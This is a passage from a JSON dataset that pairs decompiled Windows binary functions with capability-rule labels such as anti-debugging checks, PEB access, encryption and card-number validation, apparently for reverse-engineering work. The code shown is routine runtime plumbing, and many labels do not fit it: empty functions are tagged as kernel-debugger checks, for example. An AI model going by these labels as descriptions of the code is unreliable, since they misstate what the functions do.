*(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 476
    },
    "14001d54": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t fcn.14001d54c(ulong arg1, ulong *arg2, int64_t arg3)\n\n{\n    char cVar1;\n    ulong *puVar2;\n    \n    puVar2 = arg2;\n    fcn.14001bbb4(arg2);\n    if ((*(arg2 + 0x14) & 6) == 0) {\n        *(arg3 + 0x2c) = 9;\n    }\n    else {\n        if ((*(arg2 + 0x14) >> 0xc & 1) == 0) {\n            if ((*(arg2 + 0x14) & 1) != 0) {\n                puVar2 = arg2;\n                cVar1 = fcn.14001d4d0(arg2);\n                *(arg2 + 2) = 0;\n                if (cVar1 == '\\0') goto code_r0x00014001d57d;\n                *arg2 = arg2[1];\n                LOCK();\n                *(arg2 + 0x14) = *(arg2 + 0x14) & 0xfffffffe;\n            }\n            LOCK();\n            *(arg2 + 0x14) = *(arg2 + 0x14) | 2;\n            LOCK();\n            *(arg2 + 0x14) = *(arg2 + 0x14) & 0xfffffff7;\n            *(arg2 + 2) = 0;\n            if (((*(arg2 + 0x14) & 0x4c0) == 0) && (puVar2 = arg2,  cVar1 = fcn.14001bbf4(arg2),  cVar1 == '\\0')) {\n                puVar2 = arg2;\n                fcn.14001e340(arg2);\n            }\n            cVar1 = fcn.14001d3d8(puVar2 & 0xffffffffffffff00 | arg1, arg2, arg3);\n            if (cVar1 != '\\0') {\n                return arg1;\n            }\n            goto code_r0x00014001d57d;\n        }\n        *(arg3 + 0x2c) = 0x22;\n    }\n    *(arg3 + 0x30) = 1;\ncode_r0x00014001d57d:\n    LOCK();\n    *(arg2 + 0x14) = *(arg2 + 0x14) | 0x10;\n    return 0xffffffff;\n}\n",
        "token_count": 544
    },
    "14001e02": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.14001e024(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    uint64_t uVar2;\n    \n    if (arg1 == 0xfffffffe) {\n        *(arg4 + 0x38) = 1;\n        *(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n    }\n    else {\n        if ((-1 < arg1) && (arg1 < *0x1400407d0)) {\n            uVar2 = arg1 >> 6;\n            if ((*(*(uVar2 * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) != 0) {\n                fcn.140022374(arg1 & 0xffffffff);\n                uVar1 = 0xffffffffffffffff;\n                if ((*(*(uVar2 * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) == 0) {\n                    *(arg4 + 0x30) = 1;\n                    *(arg4 + 0x2c) = 9;\n                    *(arg4 + 0x38) = 1;\n                    *(arg4 + 0x34) = 0;\n                }\n                else {\n                    uVar1 = fcn.14001e14c(arg1, arg2, arg3, arg4);\n                }\n                fcn.14002239c(arg1);\n                return uVar1;\n            }\n        }\n        *(arg4 + 0x38) = 1;\n        *(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 476
    },
    "140026bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nvoid fcn.140026bc0(ulong arg1)\n\n{\n    return;\n}\n",
        "token_count": 19
    },
    "140026cf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nvoid fcn.140026cfc(ulong arg1)\n\n{\n    return;\n}\n",
        "token_count": 19
    },
    "1400086e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.1400086e4(void)\n\n{\n    if (*0x14003e050 != 0xffffffff) {\n        fcn.14000b9e0(*0x14003e050);\n        *0x14003e050 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 67
    },
    "14000ffa": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.14000ffa0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *arg1_00;\n    \n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    iVar2 = *(arg1 + 0x30);\n    arg1_00 = *(*(arg1 + 0x18) + -8);\n    iVar1 = *(arg1 + 0x34);\n    if (iVar2 == -1) {\n        iVar2 = 0x7fffffff;\n    }\n    *(arg1 + 0x40) = arg1_00;\n    if ((iVar1 == 2) ||\n       (((iVar1 != 3 && (iVar1 != 0xc)) && ((*(arg1 + 0x34) == 0xd || ((*(arg1 + 0x39) + 0x9dU & 0xef) == 0)))))) {\n        if (arg1_00 == NULL) {\n            arg1_00 = \"(null)\";\n            *(arg1 + 0x40) = \"(null)\";\n        }\n        uVar3 = fcn.140015a78(arg1_00, iVar2);\n    }\n    else {\n        if (arg1_00 == NULL) {\n            arg1_00 = 0x14002da60;\n            *(arg1 + 0x40) = 0x14002da60;\n        }\n        *(arg1 + 0x4c) = 1;\n        uVar3 = fcn.140015bc8(arg1_00, iVar2);\n    }\n    *(arg1 + 0x48) = uVar3;\n    return 1;\n}\n",
        "token_count": 388
    },
    "14001003": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.140010038(ulong *arg1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t arg1_00;\n    \n    arg1[3] = arg1[3] + 8;\n    uVar2 = *(arg1 + 6);\n    arg1_00 = *(arg1[3] + -8);\n    arg1[8] = arg1_00;\n    if (uVar2 == 0xffffffff) {\n        uVar2 = 0x7fffffff;\n    }\n    cVar1 = fcn.14000c5fc(*arg1, *(arg1 + 0x3a), *(arg1 + 0x34));\n    if (cVar1 == '\\0') {\n        if (arg1_00 == 0) {\n            arg1[8] = \"(null)\";\n        }\n        uVar3 = fcn.1400100d0(arg1, uVar2);\n    }\n    else {\n        if (arg1_00 == 0) {\n            arg1_00 = 0x14002da60;\n            arg1[8] = 0x14002da60;\n        }\n        *(arg1 + 0x4c) = 1;\n        uVar3 = fcn.140015bc8(arg1_00, uVar2);\n    }\n    *(arg1 + 9) = uVar3;\n    return 1;\n}\n",
        "token_count": 322
    },
    "14001984": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.140019848(ulong noname_0, ulong lpFlsData)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    if ((*0x14003e250 == -1) || (iVar3 = sub.KERNEL32.dll_FlsGetValue(),  iVar3 == 0)) {\n        iVar2 = sub.KERNEL32.dll_FlsSetValue(*0x14003e250, 0xffffffffffffffff);\n        if (iVar2 != 0) {\n            iVar3 = fcn.140019ad4(1, 0x3c8);\n            if (iVar3 == 0) {\n                sub.KERNEL32.dll_FlsSetValue(*0x14003e250, 0);\n                iVar3 = 0;\n            }\n            else {\n                iVar2 = sub.KERNEL32.dll_FlsSetValue(*0x14003e250, iVar3);\n                if (iVar2 != 0) {\n                    fcn.140019524(iVar3);\n                    fcn.140019b4c(0);\n                    return iVar3;\n                }\n                sub.KERNEL32.dll_FlsSetValue(*0x14003e250, 0);\n            }\n            fcn.140019b4c(iVar3);\n        }\n    }\n    else if (iVar3 != -1) {\n        return iVar3;\n    }\n    fcn.140012b4c();\n    pcVar1 = swi(3);\n    iVar3 = (*pcVar1)();\n    return iVar3;\n}\n",
        "token_count": 334
    },
    "1400199b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.1400199b4(ulong noname_0, int64_t lpFlsData)\n\n{\n    int32_t iVar1;\n    int64_t arg1;\n    int64_t iVar2;\n    \n    iVar2 = 0;\n    if ((*0x14003e250 == -1) || (arg1 = sub.KERNEL32.dll_FlsGetValue(),  arg1 == 0)) {\n        iVar1 = sub.KERNEL32.dll_FlsSetValue(*0x14003e250, 0xffffffffffffffff);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        arg1 = fcn.140019ad4(1, 0x3c8);\n        if (arg1 == 0) {\n            sub.KERNEL32.dll_FlsSetValue(*0x14003e250, 0);\n            arg1 = 0;\n        }\n        else {\n            iVar1 = sub.KERNEL32.dll_FlsSetValue(*0x14003e250, arg1);\n            if (iVar1 != 0) {\n                fcn.140019524(arg1);\n                fcn.140019b4c(0);\n                goto code_r0x000140019a55;\n            }\n            sub.KERNEL32.dll_FlsSetValue(*0x14003e250, 0);\n        }\n        fcn.140019b4c(arg1);\n    }\n    else {\n        if (arg1 == -1) {\n            return 0;\n        }\ncode_r0x000140019a55:\n        iVar2 = lpFlsData * 0x3c8 + arg1;\n    }\n    return iVar2;\n}\n",
        "token_count": 359
    },
    "140019ab": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.140019ab0(void)\n\n{\n    if (*0x14003e250 != -1) {\n        sub.KERNEL32.dll_FlsFree();\n        *0x14003e250 = -1;\n    }\n    return 1;\n}\n",
        "token_count": 56
    },
    "140015fd": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong fcn.140015fd4(ulong arg1)\n\n{\n    ulong uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = *0x14003e020 & 0x3f;\n    if (((*0x14003e020 ^ *0x140040060) >> uVar2 | (*0x14003e020 ^ *0x140040060) << 0x40 - uVar2) == 0) {\n        return 0;\n    }\n    // WARNING: Could not recover jumptable at 0x000140016005. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**0x14002b348)(arg1);\n    return uVar1;\n}\n",
        "token_count": 166
    },
    "140016af": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.140016af4(uint64_t arg1)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    \n    if (*0x1400401a0 == *0x14003e020) {\n        uVar2 = 0x40 - (*0x14003e020 & 0x3f) & 0x3f;\n        *0x1400401a0 = (arg1 >> uVar2 | arg1 << 0x40 - uVar2) ^ *0x14003e020;\n        return;\n    }\n    fcn.140018a74(arg1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 158
    },
    "14001871": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong fcn.140018718(int64_t **arg1)\n\n{\n    uint64_t uVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    uint64_t *puVar4;\n    uint8_t uVar5;\n    uint64_t *puVar6;\n    uint64_t *puVar7;\n    uint64_t *lpMem;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint64_t *puVar10;\n    \n    uVar1 = *0x14003e020;\n    puVar6 = **arg1;\n    if (puVar6 == NULL) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar5 = *0x14003e020 & 0x3f;\n        lpMem = (*puVar6 ^ *0x14003e020) >> uVar5 | (*puVar6 ^ *0x14003e020) << 0x40 - uVar5;\n        puVar6 = (puVar6[1] ^ *0x14003e020) >> uVar5 | (puVar6[1] ^ *0x14003e020) << 0x40 - uVar5;\n        puVar7 = puVar6;\n        uVar3 = *0x14003e020;\n        puVar10 = lpMem;\n        if (lpMem - 1U < 0xfffffffffffffffe) {\n            while (puVar6 = puVar6 + -1,  lpMem <= puVar6) {\n                if (*puVar6 != uVar1) {\n                    *puVar6 = uVar1;\n                    (**0x14002b348)();\n                    uVar5 = *0x14003e020 & 0x3f;\n                    uVar8 = ***arg1 ^ *0x14003e020;\n                    uVar3 = (**arg1)[1] ^ *0x14003e020;\n                    puVar9 = uVar8 >> uVar5 | uVar8 << 0x40 - uVar5;\n                    puVar4 = uVar3 >> uVar5 | uVar3 << 0x40 - uVar5;\n                    uVar3 = *0x14003e020;\n                    if ((puVar9 != puVar10) || (puVar4 != puVar7)) {\n                        puVar6 = puVar4;\n                        puVar7 = puVar4;\n                        lpMem = puVar9;\n                        puVar10 = puVar9;\n                    }\n                }\n            }\n            if (lpMem != 0xffffffffffffffff) {\n                fcn.140019b4c(lpMem);\n                uVar3 = *0x14003e020;\n            }\n            ***arg1 = uVar3;\n            *(**arg1 + 8) = uVar3;\n            *(**arg1 + 0x10) = uVar3;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 652
    },
    "140019c3": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.140019c38(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    uVar7 = arg1;\n    uVar6 = *0x14003e020 ^ *(uVar7 * 8 + 0x1400402d0);\n    uVar3 = *0x14003e020 & 0x3f;\n    uVar6 = uVar6 >> uVar3 | uVar6 << 0x40 - uVar3;\n    if (uVar6 != 0xffffffffffffffff) {\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        if (arg3 != arg4) {\n            do {\n                uVar6 = *arg3;\n                iVar5 = *(uVar6 * 8 + 0x140040230);\n                if (iVar5 == 0) {\n                    arg1_00 = *(uVar6 * 8 + 0x140031570);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0);\n                    if ((iVar5 != 0) ||\n                       ((((iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 == 0x57 &&\n                          (iVar4 = fcn.1400193d0(arg1_00, L\"api-ms-\", 7),  iVar4 != 0)) &&\n                         (iVar4 = fcn.1400193d0(arg1_00, L\"ext-ms-\", 7),  iVar4 != 0)) &&\n                        (iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0, 0),  iVar5 != 0)))) {\n                        piVar1 = uVar6 * 8 + 0x140040230;\n                        iVar2 = *piVar1;\n                        *piVar1 = iVar5;\n                        if (iVar2 != 0) {\n                            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n                        }\n                        goto code_r0x000140019dbd;\n                    }\n                    *(uVar6 * 8 + 0x140040230) = 0xffffffffffffffff;\n                }\n                else if (iVar5 != -1) {\ncode_r0x000140019dbd:\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, arg2);\n                    if (uVar6 != 0) {\n                        uVar3 = 0x40 - (*0x14003e020 & 0x3f) & 0x3f;\n                        *(uVar7 * 8 + 0x1400402d0) = (uVar6 >> uVar3 | uVar6 << 0x40 - uVar3) ^ *0x14003e020;\n                        return uVar6;\n                    }\n                    break;\n                }\n                arg3 = arg3 + 1;\n            } while (arg3 != arg4);\n        }\n        uVar3 = 0x40 - (*0x14003e020 & 0x3f) & 0x3f;\n        *(uVar7 * 8 + 0x1400402d0) = (0xffffffffffffffffU >> uVar3 | -1 << 0x40 - uVar3) ^ *0x14003e020;\n    }\n    return 0;\n}\n",
        "token_count": 811
    },
    "14001f69": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.14001f69c(ulong noname_0, uint32_t *arg2, ulong noname_2, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    fcn.140011ea4(*arg2);\n    uVar1 = *0x14003e020 & 0x3f;\n    uVar2 = *0x14003e020 ^ *0x140040808;\n    fcn.140011ef8(*arg4);\n    return uVar2 >> uVar1 | uVar2 << 0x40 - uVar1;\n}\n",
        "token_count": 144
    },
    "14002237": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.140022374(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000140022394. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((arg1 >> 6) * 8 + 0x1400403d0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 101
    },
    "14002239": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.14002239c(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x0001400223bc. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((arg1 >> 6) * 8 + 0x1400403d0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 104
    },
    "14002649": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint64_t fcn.140026498(uint8_t *arg1, ulong arg2, ulong *arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    \n    if (arg1 != NULL) {\n        if (arg2 != 0) {\n            if ((arg2 & 0xffffff80) == 0) {\n                *arg1 = arg2;\n                return 1;\n            }\n            if ((arg2 & 0xfffff800) == 0) {\n                iVar1 = 1;\n                uVar4 = 0xc0;\n                iVar2 = iVar1;\n            }\n            else if ((arg2 & 0xffff0000) == 0) {\n                if (arg2 - 0xd800 < 0x800) {\ncode_r0x000140028954:\n                    *arg3 = 0;\n                    *(arg4 + 0x30) = 1;\n                    *(arg4 + 0x2c) = 0x2a;\n                    return -1;\n                }\n                iVar1 = 2;\n                uVar4 = 0xe0;\n                iVar2 = iVar1;\n            }\n            else {\n                if (((arg2 & 0xffe00000) != 0) || (0x10ffff < arg2)) goto code_r0x000140028954;\n                iVar1 = 3;\n                uVar4 = 0xf0;\n                iVar2 = iVar1;\n            }\n            do {\n                uVar3 = arg2;\n                arg2._0_4_ = arg2 >> 6;\n                arg1[iVar1] = uVar3 & 0x3f | 0x80;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n            *arg1 = arg2 | uVar4;\n            *arg3 = 0;\n            return iVar2 + 1;\n        }\n        *arg1 = 0;\n    }\n    *arg3 = 0;\n    return 1;\n}\n",
        "token_count": 462
    },
    "14000c29": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000c298(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00014000c29c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 76
    },
    "14000c2a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000c2a4(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00014000c2a8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 80
    },
    "14000dc3": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.14000dc3c(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = *(arg1 + 0x458);\n    if (iVar3 == 0) {\n        uVar1 = 0x100;\n        iVar3 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 2;\n    }\n    iVar3 = iVar3 + (uVar1 - 1) * 2;\n    *(arg1 + 0x40) = iVar3;\n    iVar2 = iVar3;\n    while( true ) {\n        if ((*(arg1 + 0x30) < 1) && (arg2 == 0)) break;\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        **(arg1 + 0x40) = (arg2 & 7) + 0x30;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        iVar2 = *(arg1 + 0x40);\n        arg2._0_4_ = arg2 >> 3;\n    }\n    *(arg1 + 0x48) = iVar3 - iVar2 >> 1;\n    *(arg1 + 0x40) = iVar2 + 2;\n    return;\n}\n",
        "token_count": 330
    },
    "14000deb": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.14000deb0(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t in_R8B;\n    uint16_t uVar3;\n    int64_t iVar4;\n    \n    iVar4 = *(arg1 + 0x458);\n    if (iVar4 == 0) {\n        uVar1 = 0x100;\n        iVar4 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 2;\n    }\n    iVar4 = iVar4 + (uVar1 - 1) * 2;\n    *(arg1 + 0x40) = iVar4;\n    iVar2 = iVar4;\n    while( true ) {\n        if ((*(arg1 + 0x30) < 1) && (arg2 == 0)) break;\n        uVar3 = arg2;\n        arg2._0_4_ = arg2 >> 4;\n        uVar3 = (uVar3 & 0xf) + 0x30;\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        if (0x39 < uVar3) {\n            uVar3 = (in_R8B ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(arg1 + 0x40) = uVar3;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x48) = iVar4 - iVar2 >> 1;\n    *(arg1 + 0x40) = iVar2 + 2;\n    return;\n}\n",
        "token_count": 405
    },
    "14000dfd": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.14000dfd0(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = *(arg1 + 0x458);\n    if (iVar3 == 0) {\n        uVar1 = 0x100;\n        iVar3 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 2;\n    }\n    iVar3 = iVar3 + (uVar1 - 1) * 2;\n    *(arg1 + 0x40) = iVar3;\n    iVar2 = iVar3;\n    for (; (0 < *(arg1 + 0x30) || (arg2 != 0)); arg2 = arg2 >> 3) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        **(arg1 + 0x40) = (arg2 & 7) + 0x30;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x48) = iVar3 - iVar2 >> 1;\n    *(arg1 + 0x40) = iVar2 + 2;\n    return;\n}\n",
        "token_count": 317
    },
    "14000e25": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.14000e250(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t in_R8B;\n    uint16_t uVar3;\n    int64_t iVar4;\n    \n    iVar4 = *(arg1 + 0x458);\n    if (iVar4 == 0) {\n        uVar1 = 0x100;\n        iVar4 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 2;\n    }\n    iVar4 = iVar4 + (uVar1 - 1) * 2;\n    *(arg1 + 0x40) = iVar4;\n    iVar2 = iVar4;\n    while ((0 < *(arg1 + 0x30) || (arg2 != 0))) {\n        uVar3 = arg2;\n        arg2 = arg2 >> 4;\n        uVar3 = (uVar3 & 0xf) + 0x30;\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        if (0x39 < uVar3) {\n            uVar3 = (in_R8B ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(arg1 + 0x40) = uVar3;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x48) = iVar4 - iVar2 >> 1;\n    *(arg1 + 0x40) = iVar2 + 2;\n    return;\n}\n",
        "token_count": 393
    },
    "1400248f": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t fcn.1400248fc(uint16_t *arg1)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = *arg1;\n    arg1 = arg1 + 1;\n    iVar4 = 0;\n    do {\n        if (uVar3 == 0) {\n            return iVar4;\n        }\n        if (uVar3 - 0x61 < 6) {\n            iVar1 = -0x27;\ncode_r0x000140024929:\n            uVar2 = uVar3 + iVar1;\n        }\n        else {\n            uVar2 = uVar3;\n            if (uVar3 - 0x41 < 6) {\n                iVar1 = -7;\n                goto code_r0x000140024929;\n            }\n        }\n        uVar3 = *arg1;\n        iVar4 = iVar4 * 0x10 + -0x30 + uVar2;\n        arg1 = arg1 + 1;\n    } while( true );\n}\n",
        "token_count": 242
    },
    "14000dd6": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.14000dd6c(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint16_t uVar3;\n    int64_t iVar4;\n    uint8_t in_R8B;\n    \n    iVar4 = *(arg1 + 0x458);\n    if (iVar4 == 0) {\n        uVar1 = 0x100;\n        iVar4 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 2;\n    }\n    iVar4 = iVar4 + (uVar1 - 1) * 2;\n    *(arg1 + 0x40) = iVar4;\n    iVar2 = iVar4;\n    uVar1 = arg2;\n    while ((0 < *(arg1 + 0x30) || (uVar1 != 0))) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        uVar3 = uVar1 + (uVar1 / 10) * -10 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = (in_R8B ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(arg1 + 0x40) = uVar3;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        iVar2 = *(arg1 + 0x40);\n        uVar1 = uVar1 / 10;\n    }\n    *(arg1 + 0x48) = iVar4 - iVar2 >> 1;\n    *(arg1 + 0x40) = iVar2 + 2;\n    return;\n}\n",
        "token_count": 401
    },
    "14000e10": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.14000e104(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint16_t uVar3;\n    int64_t iVar4;\n    uint8_t in_R8B;\n    \n    iVar4 = *(arg1 + 0x458);\n    if (iVar4 == 0) {\n        uVar1 = 0x100;\n        iVar4 = arg1 + 0x50;\n    }\n    else {\n        uVar1 = *(arg1 + 0x450) >> 2;\n    }\n    iVar4 = iVar4 + (uVar1 - 1) * 2;\n    *(arg1 + 0x40) = iVar4;\n    iVar2 = iVar4;\n    while ((0 < *(arg1 + 0x30) || (arg2 != 0))) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) + -1;\n        uVar3 = arg2 + (arg2 / 10) * -10 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = (in_R8B ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(arg1 + 0x40) = uVar3;\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        iVar2 = *(arg1 + 0x40);\n        arg2 = arg2 / 10;\n    }\n    *(arg1 + 0x48) = iVar4 - iVar2 >> 1;\n    *(arg1 + 0x40) = iVar2 + 2;\n    return;\n}\n",
        "token_count": 389
    },
    "140026a8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
